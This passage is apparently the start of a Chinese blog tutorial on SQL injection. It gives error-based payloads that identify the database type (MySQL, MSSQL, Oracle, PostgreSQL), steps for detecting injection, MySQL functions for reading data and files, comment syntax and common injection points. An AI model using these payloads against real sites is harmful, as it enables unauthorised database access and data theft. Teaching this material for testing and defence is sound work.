<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="sql注入," />










<meta name="description" content="sql注入基础知识判断数据库类型12345Mysql: &#x2F;?param&#x3D;1 and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)))MSSQL: &#x2F;?param&#x3D;1 and(1)&#x3D;convert(int,@@version)--Sybase: &#x2F;?param&#x3D;1">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入详解">
<meta property="og:url" content="https://h4ckforjob.github.io/2025/12/17/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="h4ckforjob&#39;sblog">
<meta property="og:description" content="sql注入基础知识判断数据库类型12345Mysql: &#x2F;?param&#x3D;1 and (select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)))MSSQL: &#x2F;?param&#x3D;1 and(1)&#x3D;convert(int,@@version)--Sybase: &#x2F;?param&#x3D;1">
<meta property="og:locale">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172612947.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172723669.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172925212.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173148997.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173334542.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173410805.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173457310.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173544464.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-apache-test2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php-nginx-test2.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aiy-post-test2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/dog-post-test2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/union-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/float-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8e0-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/50000-test.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass1.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass3.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass4.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass5.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass6.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass7.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass8.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass9.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass10.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass11.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/sql-join.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass1.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461187407-41.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461194890-43.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass3.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass4.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass5.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass1.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/fuzz-bypass1.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass1.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass2.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass3.jpg">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php_path_info_exp.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/null_char_exp.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/N_exp.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/iis_asp_mssql_d_safe.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_path_exp.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_0a_exp.png">
<meta property="og:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1e_aspx_asp_exp.png">
<meta property="article:published_time" content="2025-12-17T02:05:10.000Z">
<meta property="article:modified_time" content="2026-01-15T07:22:07.499Z">
<meta property="article:author" content="h4ckforjob">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://h4ckforjob.github.io/images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172612947.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://h4ckforjob.github.io/2025/12/17/sql注入详解/"/>





  <title>sql注入详解 | h4ckforjob'sblog</title>
  








<meta name="generator" content="Hexo 7.3.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">h4ckforjob'sblog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://h4ckforjob.github.io/2025/12/17/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="h4ckforjob'sblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">sql注入详解</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2025-12-17T10:05:10+08:00">
                2025-12-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            浏览: <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span> 次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  21.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  92 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h1><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mysql: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))</span><br><span class="line">MSSQL: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,@<span class="variable">@version</span>)<span class="comment">--</span></span><br><span class="line">Sybase: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,@<span class="variable">@version</span>)<span class="comment">--</span></span><br><span class="line">Oracle <span class="operator">&gt;=</span><span class="number">9.0</span>: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">upper</span>(XMLType(chr(<span class="number">60</span>)<span class="operator">||</span>chr(<span class="number">58</span>)<span class="operator">||</span>chr(<span class="number">58</span>)<span class="operator">||</span>(<span class="keyword">select</span> replace(banner,chr(<span class="number">32</span>),chr(<span class="number">58</span>)) <span class="keyword">from</span> sys.v\_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">||</span>chr(<span class="number">62</span>))) <span class="keyword">from</span> dual)—</span><br><span class="line">PostgreSQL: <span class="operator">/</span>?param<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span><span class="built_in">cast</span>(version() <span class="keyword">as</span> <span class="type">numeric</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h2 id="检查注入的思路"><a href="#检查注入的思路" class="headerlink" title="检查注入的思路"></a>检查注入的思路</h2><ul>
<li><p>通过加单引号 双引号看看是否有报错。</p>
<ul>
<li><p>有报错（不一定有注入）：</p>
<ul>
<li>通过拼接语句来进行状态判断<ul>
<li>and ,or</li>
</ul>
</li>
</ul>
</li>
<li><p>没有报错（有可能是盲注）：</p>
<ul>
<li>如果关闭错误回显的话 基于报错注入就不可能了。</li>
<li>构造语句利用延时注入和联合注入进行攻击<ul>
<li>sleep benchmark extractvalue</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>看状态码(正常的话是200 注入的话可能会存在500 302等)</p>
</li>
<li><p>特殊注入需要额外观察：</p>
<ul>
<li>宽字节注入</li>
<li>url二次注入</li>
</ul>
</li>
</ul>
<h1 id="Mysql注入"><a href="#Mysql注入" class="headerlink" title="Mysql注入"></a>Mysql注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VERSION()</span><br><span class="line">@@VERSION</span><br><span class="line">@@GLOBAL.VERSION</span><br></pre></td></tr></table></figure>

<h3 id="查看当前编码"><a href="#查看当前编码" class="headerlink" title="查看当前编码"></a>查看当前编码</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;character_set_database&#x27;;</span><br><span class="line">使用SQL语句：</span><br><span class="line">alter database xxx CHARACTER SET gb2312;</span><br><span class="line">可以设置xxx数据库的编码为gb2312.</span><br></pre></td></tr></table></figure>

<h3 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@hostname</span><br></pre></td></tr></table></figure>

<h3 id="查看操作系统"><a href="#查看操作系统" class="headerlink" title="查看操作系统"></a>查看操作系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure>

<h3 id="查看当前登录用户"><a href="#查看当前登录用户" class="headerlink" title="查看当前登录用户"></a>查看当前登录用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER()</span><br><span class="line">CURRENT_USER()</span><br><span class="line">SYSTEM_USER()</span><br><span class="line">SESSION_USER()</span><br><span class="line">一句话执行：SELECT USER(),CURRENT_USER(),SYSTEM_USER(),SESSION_USER()</span><br></pre></td></tr></table></figure>

<h3 id="查看当前使用的数据库"><a href="#查看当前使用的数据库" class="headerlink" title="查看当前使用的数据库"></a>查看当前使用的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DATABASE()</span><br><span class="line">SCHEMA()</span><br></pre></td></tr></table></figure>

<h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@@secure_file_priv              #查询安全文件上传路径</span><br><span class="line">@@BASEDIR                       #mysql安装路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR             #临时文件夹路径</span><br><span class="line">@@DATADIR                       #数据存储路径</span><br><span class="line">@@CHARACTER_SETS_DIR            #字符集设置文件路径</span><br><span class="line">@@LOG_ERROR                     #错误日志文件路径</span><br><span class="line">@@PID_FILE                      #pid-file文件路径</span><br><span class="line">@@SLAVE_LOAD_TMPDIR             #临时文件夹路径</span><br></pre></td></tr></table></figure>

<h3 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">insert</span><br><span class="line">update</span><br><span class="line">where</span><br><span class="line">limit                           #读取记录</span><br><span class="line">hex</span><br></pre></td></tr></table></figure>

<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.csdn.net/wxq544483342/article/details/51476348</span><br></pre></td></tr></table></figure>

<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@@GROUP_CONCAT_MAX_LEN          #是 MySQL 中用于限制 GROUP_CONCAT() 函数能够连接成的最大字符串长度的系统变量，默认通常是 1024 字节（或字符）</span><br><span class="line">@@max_allowed_packet            #要读取的文件大小必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>

<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">system_user()                   #系统用户名</span><br><span class="line">user()                          #用户名</span><br><span class="line">current_user()                  #当前用户名</span><br><span class="line">session_user()                  #连接数据库的用户名</span><br><span class="line">database()                      #数据库名</span><br><span class="line">version()                       #MYSQL数据库版本</span><br><span class="line">load_file()                     #MYSQL读取本地文件的函数</span><br><span class="line">mod(N,M)                        #该函数返回N除以M后的余数</span><br><span class="line">concat()                        #函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULLMySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</span><br><span class="line">concat_ws()                     #函数在执行的时候,不会因为NULL值而返回NULL</span><br><span class="line">group_concat()                  #将group by产生的同一个分组中的值连接起来，返回一个字符串结果</span><br></pre></td></tr></table></figure>

<h3 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母&#x2F;数字相关"></a>字母&#x2F;数字相关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ASCII():                        #返回字符串 str 中最左边字符的 ASCII 代码值</span><br><span class="line">BIN():                          #返回值的二进制串表示</span><br><span class="line">CONV():                         #进制转换</span><br><span class="line">convert()                       #主要作用是将一个表达式或值转换为指定的数据类型或字符集</span><br><span class="line">char_length()                   #计算字符串的字符数</span><br><span class="line">FLOOR()                         #向下取整</span><br><span class="line">ROUND()                         #对数字进行四舍五入到指定的小数位数</span><br><span class="line">LOWER()                         #转成小写字母</span><br><span class="line">UPPER()                         #转成大写字母</span><br><span class="line">HEX()                           #返回参数的16进制数的字符串形式</span><br><span class="line">UNHEX()                         #十六进制解码</span><br></pre></td></tr></table></figure>

<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">left()	                        #返回字符串 str 自左数的 len 个字符。如果任一参数为 NULL，则返回 NULL</span><br><span class="line">right()	                        #返回 str 右边末 len 位的字符。如果有的参数是 NULL 值，则返回 NULL</span><br><span class="line">SUBSTR(str, pos, len)           #从一个字符串中截取指定长度的子字符串</span><br><span class="line">SUBSTRING(str,pos)              #从pos开始取，取len长度</span><br><span class="line">SUBSTRING(str FROM pos)         #从from开始取</span><br><span class="line">SUBSTRING(str,pos,len)          #从pos开始取，取len长度</span><br><span class="line">SUBSTRING(str FROM pos FOR len) #从from开始取，取len长度，mid()适用</span><br><span class="line">substring_index()               #SUBSTRING_INDEX(str,delim,count)返回 str 中第 count 次出现的分隔符 delim 之前的子字符串。如果 count 为正数，将最后一个分隔符左边（因为是从左数分隔符）的所有内容作为子字符串返回；如果 count 为负值，返回最后一个分隔符右边（因为是从右数分隔符）的所有内容作为子字符串返回</span><br><span class="line">mid()                           #MID(str,pos,len) 作用等同于 SUBSTRING(str,pos,len)</span><br><span class="line">LPAD(str,len,padstr)            #左补齐函数。将字符串 str 左侧利用字符串 padstr 补齐为整体长度为 len 的字符串。如果 str 大于 len，则返回值会缩减到 len 个字符</span><br><span class="line">RPAD(str,len,padstr)            #右补齐函数</span><br></pre></td></tr></table></figure>

<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">从&#x27;#&#x27;字符到行尾。</span><br><span class="line">从&#x27;--空格&#x27;序列到行尾。</span><br><span class="line">从/*序列到后面的*/序列。结束序列不一定在同一行中，因此该语法允许注释跨越多行。</span><br><span class="line">//, -- , /**/, #, --+, -- -, ;%00 , `</span><br></pre></td></tr></table></figure>

<h2 id="普通注入技术"><a href="#普通注入技术" class="headerlink" title="普通注入技术"></a>普通注入技术</h2><h3 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h3><ol>
<li>判断是数字型还是字符型参数</li>
<li>猜测语句，构造闭合</li>
<li>注入（报错注入、布尔&#x2F;时间盲注、联合查询注入、堆叠查询注入、内联查询注入）</li>
</ol>
<h3 id="常见sql注入位置"><a href="#常见sql注入位置" class="headerlink" title="常见sql注入位置"></a>常见sql注入位置</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 常见GET、POST参数</span><br><span class="line">2. http头(X-Forwarded-For头、cookie)</span><br></pre></td></tr></table></figure>

